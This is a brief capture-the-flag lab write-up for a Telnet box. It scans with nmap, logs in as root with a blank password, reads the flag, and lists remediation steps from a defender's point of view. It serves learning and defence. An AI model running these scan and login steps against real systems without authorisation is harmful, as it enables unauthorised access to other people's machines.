# Meow - Telnet (Port 23)

## Objective
Enumerate open ports and gain access via insecure Telnet service.

## 1. Recon - Nmap Scan
sudo nmap -sS -Pn -F <TARGET-IP>
Result: 23/tcp open telnet

## 2. Enumeration
sudo nmap -sS -Pn -p 23 -sV <TARGET-IP>
Service: Telnet

## 3. Exploitation
telnet <TARGET-IP> 23
Login: root
Password: [blank - just Enter]

## 4. Post-Exploitation
ls
cat flag.txt

## Vulnerability
- Telnet sends username/password in CLEAR TEXT
- Root account with blank password

## Remediation (SOC Perspective)
- Disable Telnet completely
- Use SSH (Port 22) with key-based auth
- Enforce strong passwords, disable root remote login
- Alert on Port 23 traffic in SIEM

## Skill Learned
Clear-text protocol analysis, Remote login exploitation
